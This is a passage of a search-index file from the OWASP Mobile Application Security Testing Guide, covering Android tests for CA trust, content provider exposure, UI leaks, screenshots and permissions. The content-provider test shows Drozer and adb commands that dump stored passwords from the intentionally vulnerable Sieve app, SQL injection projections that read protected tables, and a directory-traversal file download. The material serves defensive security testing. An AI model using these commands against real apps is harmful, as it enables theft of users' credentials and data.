to confirm the incorrect implementation ( Reviewing Decompiled Java Code).</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0285/","title":"MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs","text":"","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0285/#overview","title":"Overview","text":"<p>This test evaluates whether an Android app implicitly trusts user-added CA certificates by default, which is the case for apps that can be installed to devices running API level 23 or lower.</p> <p>Those apps rely on the default Network Security Configuration that trusts both system and user-installed Certificate Authorities (CAs). Such trust can expose the app to MITM attacks, as malicious CAs installed by users could intercept secure communications.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0285/#steps","title":"Steps","text":"<ol> <li>Obtain the AndroidManifest.xml ( Obtaining Information from the AndroidManifest).</li> <li>Read the value of the <code>minSdkVersion</code> attribute from the <code>&lt;uses-sdk&gt;</code> element.</li> </ol>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0285/#observation","title":"Observation","text":"<p>The output contains the value of <code>minSdkVersion</code>.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0285/#evaluation","title":"Evaluation","text":"<p>The test case fails if <code>minSdkVersion</code> is less than 24.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0286/","title":"MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs","text":"","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0286/#overview","title":"Overview","text":"<p>This test evaluates whether an Android app explicitly trusts user-added CA certificates by including <code>&lt;certificates src=\"user\"/&gt;</code> in its Network Security Configuration. Even though starting with Android 7.0 (API level 24) apps no longer trust user-added CAs by default, this configuration overrides that behavior.</p> <p>Such trust can expose the application to MITM attacks, as malicious CAs installed by users could intercept secure communications.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0286/#steps","title":"Steps","text":"<ol> <li>Obtain the AndroidManifest.xml ( Obtaining Information from the AndroidManifest).</li> <li>Check if an <code>android:networkSecurityConfig</code> attribute is set in the <code>&lt;application&gt;</code> tag.</li> <li>Inspect the referenced Network Security Configuration file, and extract all uses of <code>&lt;certificates src=\"user\" /&gt;</code>.</li> </ol>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0286/#observation","title":"Observation","text":"<p>The output contains all the <code>&lt;trust-anchors&gt;</code> from the Network Security Configuration file along with any defined <code>&lt;certificates&gt;</code> entries, if present.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0286/#evaluation","title":"Evaluation","text":"<p>The test case fails if <code>&lt;certificates src=\"user\" /&gt;</code> has been defined as part of the <code>&lt;trust-anchors&gt;</code> in the Network Security Configuration file.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/","title":"MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#static-analysis","title":"Static Analysis","text":"<p>The first step is to look at <code>AndroidManifest.xml</code> to detect content providers exposed by the app. You can identify content providers by the <code>&lt;provider&gt;</code> element. Complete the following steps:</p> <ul> <li>Determine whether the value of the export tag (<code>android:exported</code>) is <code>\"true\"</code>. Even if it is not, the tag will be set to <code>\"true\"</code> automatically if an <code>&lt;intent-filter&gt;</code> has been defined for the tag. If the content is meant to be accessed only by the app itself, set <code>android:exported</code> to <code>\"false\"</code>. If not, set the flag to <code>\"true\"</code> and define proper read/write permissions.</li> <li>Determine whether the data is being protected by a permission tag (<code>android:permission</code>). Permission tags limit exposure to other apps.</li> <li>Determine whether the <code>android:protectionLevel</code> attribute has the value <code>signature</code>. This setting indicates that the data is intended to be accessed only by apps from the same enterprise (i.e., signed with the same key). To make the data accessible to other apps, apply a security policy with the <code>&lt;permission&gt;</code> element and set a proper <code>android:protectionLevel</code>. If you use <code>android:permission</code>, other applications must declare corresponding <code>&lt;uses-permission&gt;</code> elements in their manifests to interact with your content provider. You can use the <code>android:grantUriPermissions</code> attribute to grant more specific access to other apps; you can limit access with the <code>&lt;grant-uri-permission&gt;</code> element.</li> </ul> <p>Inspect the source code to understand how the content provider is meant to be used. Search for the following keywords:</p> <ul> <li><code>android.content.ContentProvider</code></li> <li><code>android.database.Cursor</code></li> <li><code>android.database.sqlite</code></li> <li><code>.query</code></li> <li><code>.update</code></li> <li><code>.delete</code></li> </ul> <p>To avoid SQL injection attacks within the app, use parameterized query methods, such as <code>query</code>, <code>update</code>, and <code>delete</code>. Be sure to properly sanitize all method arguments; for example, the <code>selection</code> argument could lead to SQL injection if it is made up of concatenated user input.</p> <p>If you expose a content provider, determine whether parameterized query methods (<code>query</code>, <code>update</code>, and <code>delete</code>) are being used to prevent SQL injection. If so, make sure all their arguments are properly sanitized.</p> <p>We will use the vulnerable password manager app Sieve as an example of a vulnerable content provider.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#inspect-the-android-manifest","title":"Inspect the Android Manifest","text":"<p>Identify all defined <code>&lt;provider&gt;</code> elements:</p> <pre><code>&lt;provider\n      android:authorities=\"com.mwr.example.sieve.DBContentProvider\"\n      android:exported=\"true\"\n      android:multiprocess=\"true\"\n      android:name=\".DBContentProvider\"&gt;\n    &lt;path-permission\n          android:path=\"/Keys\"\n          android:readPermission=\"com.mwr.example.sieve.READ_KEYS\"\n          android:writePermission=\"com.mwr.example.sieve.WRITE_KEYS\"\n     /&gt;\n&lt;/provider&gt;\n&lt;provider\n      android:authorities=\"com.mwr.example.sieve.FileBackupProvider\"\n      android:exported=\"true\"\n      android:multiprocess=\"true\"\n      android:name=\".FileBackupProvider\"\n/&gt;\n</code></pre> <p>As shown in the <code>AndroidManifest.xml</code> above, the application exports two content providers. Note that one path (\"/Keys\") is protected by read and write permissions.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#inspect-the-source-code","title":"Inspect the source code","text":"<p>Inspect the <code>query</code> function in the <code>DBContentProvider.java</code> file to determine whether any sensitive information is being leaked:</p> <p>Example in Java:</p> <pre><code>public Cursor query(final Uri uri, final String[] array, final String s, final String[] array2, final String s2) {\n    final int match = this.sUriMatcher.match(uri);\n    final SQLiteQueryBuilder sqLiteQueryBuilder = new SQLiteQueryBuilder();\n    if (match &gt;= 100 &amp;&amp; match &lt; 200) {\n        sqLiteQueryBuilder.setTables(\"Passwords\");\n    }\n    else if (match &gt;= 200) {\n        sqLiteQueryBuilder.setTables(\"Key\");\n    }\n    return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, (String)null, (String)null, s2);\n}\n</code></pre> <p>Example in Kotlin:</p> <pre><code>fun query(uri: Uri?, array: Array&lt;String?&gt;?, s: String?, array2: Array&lt;String?&gt;?, s2: String?): Cursor {\n        val match: Int = this.sUriMatcher.match(uri)\n        val sqLiteQueryBuilder = SQLiteQueryBuilder()\n        if (match &gt;= 100 &amp;&amp; match &lt; 200) {\n            sqLiteQueryBuilder.tables = \"Passwords\"\n        } else if (match &gt;= 200) {\n            sqLiteQueryBuilder.tables = \"Key\"\n        }\n        return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, null as String?, null as String?, s2)\n    }\n</code></pre> <p>Here we see that there are actually two paths, \"/Keys\" and \"/Passwords\", and the latter is not being protected in the manifest and is therefore vulnerable.</p> <p>When accessing a URI, the query statement returns all passwords and the path <code>Passwords/</code>. We will address this in the \"Dynamic Analysis\" section and show the exact URI that is required.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#dynamic-analysis","title":"Dynamic Analysis","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#testing-content-providers","title":"Testing Content Providers","text":"<p>To dynamically analyze an application's content providers, first enumerate the attack surface: pass the app's package name to the Drozer module <code>app.provider.info</code>:</p> <pre><code>dz&gt; run app.provider.info -a com.mwr.example.sieve\n  Package: com.mwr.example.sieve\n  Authority: com.mwr.example.sieve.DBContentProvider\n  Read Permission: null\n  Write Permission: null\n  Content Provider: com.mwr.example.sieve.DBContentProvider\n  Multiprocess Allowed: True\n  Grant Uri Permissions: False\n  Path Permissions:\n  Path: /Keys\n  Type: PATTERN_LITERAL\n  Read Permission: com.mwr.example.sieve.READ_KEYS\n  Write Permission: com.mwr.example.sieve.WRITE_KEYS\n  Authority: com.mwr.example.sieve.FileBackupProvider\n  Read Permission: null\n  Write Permission: null\n  Content Provider: com.mwr.example.sieve.FileBackupProvider\n  Multiprocess Allowed: True\n  Grant Uri Permissions: False\n</code></pre> <p>In this example, two content providers are exported. Both can be accessed without permission, except for the <code>/Keys</code> path in the <code>DBContentProvider</code>. With this information, you can reconstruct part of the content URIs to access the <code>DBContentProvider</code> (the URIs begin with <code>content://</code>).</p> <p>To identify content provider URIs within the application, use Drozer's <code>scanner.provider.finduris</code> module. This module guesses paths and determines accessible content URIs in several ways:</p> <pre><code>dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve\nScanning com.mwr.example.sieve...\nUnable to Query content://com.mwr.example.sieve.DBContentProvider/\n...\nUnable to Query content://com.mwr.example.sieve.DBContentProvider/Keys\nAccessible content URIs:\ncontent://com.mwr.example.sieve.DBContentProvider/Keys/\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords/\n</code></pre> <p>Once you have a list of accessible content providers, try to extract data from each provider with the <code>app.provider.query</code> module:</p> <pre><code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical\n_id: 1\nservice: Email\nusername: incognitoguy50\npassword: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 - encoded)\nemail: incognitoguy50@gmail.com\n</code></pre> <p>You can also use Drozer to insert, update, and delete records from a vulnerable content provider:</p> <ul> <li>Insert record</li> </ul> <pre><code>dz&gt; run app.provider.insert content://com.vulnerable.im/messages\n                --string date 1331763850325\n                --string type 0\n                --integer _id 7\n</code></pre> <ul> <li>Update record</li> </ul> <pre><code>dz&gt; run app.provider.update content://settings/secure\n                --selection \"name=?\"\n                --selection-args assisted_gps_enabled\n                --integer value 0\n</code></pre> <ul> <li>Delete record</li> </ul> <pre><code>dz&gt; run app.provider.delete content://settings/secure\n                --selection \"name=?\"\n                --selection-args my_setting\n</code></pre>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#sql-injection-in-content-providers","title":"SQL Injection in Content Providers","text":"<p>The Android platform promotes SQLite databases for storing user data. Because these databases are based on SQL, they may be vulnerable to SQL injection. You can use the Drozer module <code>app.provider.query</code> to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:</p> <pre><code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"'\"\nunrecognized token: \"' FROM Passwords\" (code 1): , while compiling: SELECT ' FROM Passwords\n\ndz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \"'\"\nunrecognized token: \"')\" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')\n</code></pre> <p>If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module <code>app.provider.query</code> is used to list all the database tables:</p> <pre><code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"*\nFROM SQLITE_MASTER WHERE type='table';--\"\n| type  | name             | tbl_name         | rootpage | sql              |\n| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |\n| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |\n| table | Key              | Key              | 5        | CREATE TABLE ... |\n</code></pre> <p>SQL Injection may also be used to retrieve data from otherwise protected tables:</p> <pre><code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"* FROM Key;--\"\n| Password | pin |\n| thisismypassword | 9876 |\n</code></pre> <p>You can automate these steps with the <code>scanner.provider.injection</code> module, which automatically finds vulnerable content providers within an app:</p> <pre><code>dz&gt; run scanner.provider.injection -a com.mwr.example.sieve\nScanning com.mwr.example.sieve...\nInjection in Projection:\n  content://com.mwr.example.sieve.DBContentProvider/Keys/\n  content://com.mwr.example.sieve.DBContentProvider/Passwords\n  content://com.mwr.example.sieve.DBContentProvider/Passwords/\nInjection in Selection:\n  content://com.mwr.example.sieve.DBContentProvider/Keys/\n  content://com.mwr.example.sieve.DBContentProvider/Passwords\n  content://com.mwr.example.sieve.DBContentProvider/Passwords/\n</code></pre>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0007/#file-system-based-content-providers","title":"File System Based Content Providers","text":"<p>Content providers can provide access to the underlying filesystem. This allows apps to share files (the Android sandbox normally prevents this). You can use the Drozer modules <code>app.provider.read</code> and <code>app.provider.download</code> to read and download files, respectively, from exported file-based content providers. These content providers are susceptible to directory traversal, which allows otherwise protected files in the target application's sandbox to be read.</p> <pre><code>dz&gt; run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db\nWritten 24488 bytes\n</code></pre> <p>Use the <code>scanner.provider.traversal</code> module to automate the process of finding content providers that are susceptible to directory traversal:</p> <pre><code>dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve\nScanning com.mwr.example.sieve...\nVulnerable Providers:\n  content://com.mwr.example.sieve.FileBackupProvider/\n  content://com.mwr.example.sieve.FileBackupProvider\n</code></pre> <p>Note that <code>adb</code> can also be used to query content providers:</p> <pre><code>$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials\nRow: 0 id=1, username=admin, password=StrongPwd\nRow: 1 id=2, username=test, password=test\n...\n</code></pre>","tags":["android","L1","L2","test","MSTG-STORAGE-6","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/","title":"MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#static-analysis","title":"Static Analysis","text":"<p>Carefully review all UI components that either show such information or take it as input. Search for any traces of sensitive information and evaluate if it should be masked or completely removed.</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#text-fields","title":"Text Fields","text":"<p>To make sure an application is masking sensitive user input, check for the following attribute in the definition of <code>EditText</code>:</p> <pre><code>android:inputType=\"textPassword\"\n</code></pre> <p>With this setting, dots (instead of the input characters) will be displayed in the text field, preventing the app from leaking passwords or pins to the user interface.</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#app-notifications","title":"App Notifications","text":"<p>When statically assessing an application, it is recommended to search for any usage of the <code>NotificationManager</code> class which might be an indication of some form of notification management. If the class is being used, the next step would be to understand how the application is generating the notifications.</p> <p>These code locations can be fed into the Dynamic Analysis section below, providing an idea of where in the application notifications may be dynamically generated.</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>To determine whether the application leaks any sensitive information to the user interface, run the application and identify components that could be disclosing information.</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#text-fields_1","title":"Text Fields","text":"<p>If the information is masked by, for example, replacing input with asterisks or dots, the app isn't leaking data to the user interface.</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0008/#app-notifications_1","title":"App Notifications","text":"<p>To identify the usage of notifications run through the entire application and all its available functions looking for ways to trigger any notifications. Consider that you may need to perform actions outside of the application in order to trigger certain notifications.</p> <p>While running the application you may want to start tracing all calls to functions related to the notifications creation, e.g. <code>setContentTitle</code> or <code>setContentText</code> from <code>NotificationCompat.Builder</code>. Observe the trace in the end and evaluate if it contains any sensitive information.</p>","tags":["android","L2","test","MSTG-STORAGE-7","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0010/","title":"MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0010/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0010/#static-analysis","title":"Static Analysis","text":"<p>A screenshot of the current activity is taken when an Android app goes into background and displayed for aesthetic purposes when the app returns to the foreground. However, this may leak sensitive information.</p> <p>To determine whether the application may expose sensitive information via the app switcher, find out whether the <code>FLAG_SECURE</code> option has been set. You should find something similar to the following code snippet:</p> <p>Example in Java:</p> <pre><code>getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,\n                WindowManager.LayoutParams.FLAG_SECURE);\n\nsetContentView(R.layout.activity_main);\n</code></pre> <p>Example in Kotlin:</p> <pre><code>window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,\n                WindowManager.LayoutParams.FLAG_SECURE)\n\nsetContentView(R.layout.activity_main)\n</code></pre> <p>If the option has not been set, the application is vulnerable to screen capturing.</p>","tags":["android","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0010/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>While black-box testing the app, navigate to any screen that contains sensitive information and click the home button to send the app to the background, then press the app switcher button to see the snapshot. As shown below, if <code>FLAG_SECURE</code> is set (left image), the snapshot will be empty; if the flag has not been set (right image), activity information will be shown:</p> <p> </p> <p>On devices supporting file-based encryption (FBE), snapshots are stored in the <code>/data/system_ce/&lt;USER_ID&gt;/&lt;IMAGE_FOLDER_NAME&gt;</code> folder. <code>&lt;IMAGE_FOLDER_NAME&gt;</code> depends on the vendor but most common names are <code>snapshots</code> and <code>recent_images</code>. If the device doesn't support FBE, the <code>/data/system/&lt;IMAGE_FOLDER_NAME&gt;</code> folder is used.</p> <p>Accessing these folders and the snapshots requires root.</p>","tags":["android","L2","test","MSTG-STORAGE-9","masvs-platform-3"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/","title":"MASTG-TEST-0024: Testing for App Permissions","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Dangerous App Permissions</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#overview","title":"Overview","text":"<p>When testing app permissions the goal is to try and reduce the amount of permissions used by your app to the absolute minimum. While going through each permission, remember that it is best practice first to try and evaluate whether your app needs to use this permission because many functionalities such as taking a photo can be done without, limiting the amount of access to sensitive data. If permissions are required you will then make sure that the request/response to access the permission is handled handled correctly.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#static-analysis","title":"Static Analysis","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#android-permissions","title":"Android Permissions","text":"<p>Check permissions to make sure that the app really needs them and remove unnecessary permissions. For example, the <code>INTERNET</code> permission in the AndroidManifest.xml file is necessary for an Activity to load a web page into a WebView. Because a user can revoke an application's right to use a dangerous permission, the developer should check whether the application has the appropriate permission each time an action is performed that would require that permission.</p> <pre><code>&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n</code></pre> <p>Go through the permissions with the developer to identify the purpose of every permission set and remove unnecessary permissions.</p> <p>Besides going through the AndroidManifest.xml file manually, you can also use the Android Asset Packaging tool (aapt) to examine the permissions of an APK file.</p> <p>aapt comes with the Android SDK within the build-tools folder. It requires an APK file as input. You may list the APKs in the device by running <code>adb shell pm list packages -f | grep -i &lt;keyword&gt;</code> as seen in  Listing Installed Apps.</p> <pre><code>$ aapt d permissions app-x86-debug.apk\npackage: sg.vp.owasp_mobile.omtg_android\nuses-permission: name='android.permission.WRITE_EXTERNAL_STORAGE'\nuses-permission: name='android.permission.INTERNET'\n</code></pre> <p>Alternatively you may obtain a more detailed list of permissions via adb and the dumpsys tool:</p> <pre><code>$ adb shell dumpsys package sg.vp.owasp_mobile.omtg_android | grep permission\n    requested permissions:\n      android.permission.WRITE_EXTERNAL_STORAGE\n      android.permission.INTERNET\n      android.permission.READ_EXTERNAL_STORAGE\n    install permissions:\n      android.permission.INTERNET: granted=true\n      runtime permissions:\n</code></pre> <p>Please reference this permissions overview for descriptions of the listed permissions that are considered dangerous.</p> <pre><code>READ_CALENDAR\nWRITE_CALENDAR\nREAD_CALL_LOG\nWRITE_CALL_LOG\nPROCESS_OUTGOING_CALLS\nCAMERA\nREAD_CONTACTS\nWRITE_CONTACTS\nGET_ACCOUNTS\nACCESS_FINE_LOCATION\nACCESS_COARSE_LOCATION\nRECORD_AUDIO\nREAD_PHONE_STATE\nREAD_PHONE_NUMBERS\nCALL_PHONE\nANSWER_PHONE_CALLS\nADD_VOICEMAIL\nUSE_SIP\nBODY_SENSORS\nSEND_SMS\nRECEIVE_SMS\nREAD_SMS\nRECEIVE_WAP_PUSH\nRECEIVE_MMS\nREAD_EXTERNAL_STORAGE\nWRITE_EXTERNAL_STORAGE\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#custom-permissions","title":"Custom Permissions","text":"<p>Apart from enforcing custom permissions via the application manifest file, you can also check permissions programmatically. This is not recommended, however, because it is more error-prone and can be bypassed more easily with, e.g., runtime instrumentation. It is recommended that the <code>ContextCompat.checkSelfPermission</code> method is called to check if an activity has a specified permission. Whenever you see code like the following snippet, make sure that the same permissions are enforced in the manifest file.</p> <pre><code>private static final String TAG = \"LOG\";\nint canProcess = checkCallingOrSelfPermission(\"com.example.perm.READ_INCOMING_MSG\");\nif (canProcess != PERMISSION_GRANTED)\nthrow new SecurityException();\n</code></pre> <p>Or with <code>ContextCompat.checkSelfPermission</code> which compares it to the manifest file.</p> <pre><code>if (ContextCompat.checkSelfPermission(secureActivity.this, Manifest.READ_INCOMING_MSG)\n        != PackageManager.PERMISSION_GRANTED) {\n            //!= stands for not equals PERMISSION_GRANTED\n            Log.v(TAG, \"Permission denied\");\n        }\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#requesting-permissions","title":"Requesting Permissions","text":"<p>If your application has permissions that need to be requested at runtime, the application must call the <code>requestPermissions</code> method in order to obtain them. The app passes the permissions needed and an integer request code you have specified to the user asynchronously, returning once the user chooses to accept or deny the request in the same thread. After the response is returned the same request code is passed to the app's callback method.</p> <pre><code>private static final String TAG = \"LOG\";\n// We start by checking the permission of the current Activity\nif (ContextCompat.checkSelfPermission(secureActivity.this,\n        Manifest.permission.WRITE_EXTERNAL_STORAGE)\n        != PackageManager.PERMISSION_GRANTED) {\n\n    // Permission is not granted\n    // Should we show an explanation?\n    if (ActivityCompat.shouldShowRequestPermissionRationale(secureActivity.this,\n        //Gets whether you should show UI with rationale for requesting permission.\n        //You should do this only if you do not have permission and the permission requested rationale is not communicated clearly to the user.\n            Manifest.permission.WRITE_EXTERNAL_STORAGE)) {\n        // Asynchronous thread waits for the users response.\n        // After the user sees the explanation try requesting the permission again.\n    } else {\n        // Request a permission that doesn't need to be explained.\n        ActivityCompat.requestPermissions(secureActivity.this,\n                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},\n                MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE);\n        // MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE will be the app-defined int constant.\n        // The callback method gets the result of the request.\n    }\n} else {\n    // Permission already granted debug message printed in terminal.\n    Log.v(TAG, \"Permission already granted.\");\n}\n</code></pre> <p>Please note that if you need to provide any information or explanation to the user it needs to be done before the call to <code>requestPermissions</code>, since the system dialog box can not be altered once called.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#handling-responses-to-permission-requests","title":"Handling Responses to Permission Requests","text":"<p>Now your app has to override the system method <code>onRequestPermissionsResult</code> to see if the permission was granted. This method receives the <code>requestCode</code> integer as input parameter (which is the same request code that was created in <code>requestPermissions</code>).</p> <p>The following callback method may be used for <code>WRITE_EXTERNAL_STORAGE</code>.</p> <pre><code>@Override //Needed to override system method onRequestPermissionsResult()\npublic void onRequestPermissionsResult(int requestCode, //requestCode is what you specified in requestPermissions()\n        String permissions[], int[] permissionResults) {\n    switch (requestCode) {\n        case MY_PERMISSIONS_WRITE_EXTERNAL_STORAGE: {\n            if (grantResults.length &gt; 0\n                &amp;&amp; permissionResults[0] == PackageManager.PERMISSION_GRANTED) {\n                // 0 is a canceled request, if int array equals requestCode permission is granted.\n            } else {\n                // permission denied code goes here.\n                Log.v(TAG, \"Permission denied\");\n            }\n            return;\n        }\n        // Other switch cases can be added here for multiple permission checks.\n    }\n}\n</code></pre> <p>Permissions should be explicitly requested for every needed permission, even if a similar permission from the same group has already been requested. For applications targeting Android 7.1 (API level 25) and older, Android will automatically give an application all the permissions from a permission group, if the user grants one of the requested permissions of that group. Starting with Android 8.0 (API level 26), permissions will still automatically be granted if a user has already granted a permission from the same permission group, but the application still needs to explicitly request the permission. In this case, the <code>onRequestPermissionsResult</code> handler will automatically be triggered without any user interaction.</p> <p>For example if both <code>READ_EXTERNAL_STORAGE</code> and <code>WRITE_EXTERNAL_STORAGE</code> are listed in the Android Manifest but only permissions are granted for <code>READ_EXTERNAL_STORAGE</code>, then requesting <code>WRITE_EXTERNAL_STORAGE</code> will automatically have permissions without user interaction because they are in the same group and not explicitly requested.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#permission-analysis","title":"Permission Analysis","text":"<p>Always check whether the application is requesting permissions it actually requires. Make sure that no permissions are requested which are not related to the goal of the app, especially <code>DANGEROUS</code> and <code>SIGNATURE</code> permissions, since they can affect both the user and the application if mishandled. For instance, it should be suspicious if a single-player game app requires access to <code>android.permission.WRITE_SMS</code>.</p> <p>When analyzing permissions, you should investigate the concrete use case scenarios of the app and always check if there are replacement APIs for any <code>DANGEROUS</code> permissions in use. A good example is the SMS Retriever API which streamlines the usage of SMS permissions when performing SMS-based user verification. By using this API an application does not have to declare <code>DANGEROUS</code> permissions which is a benefit to both the user and 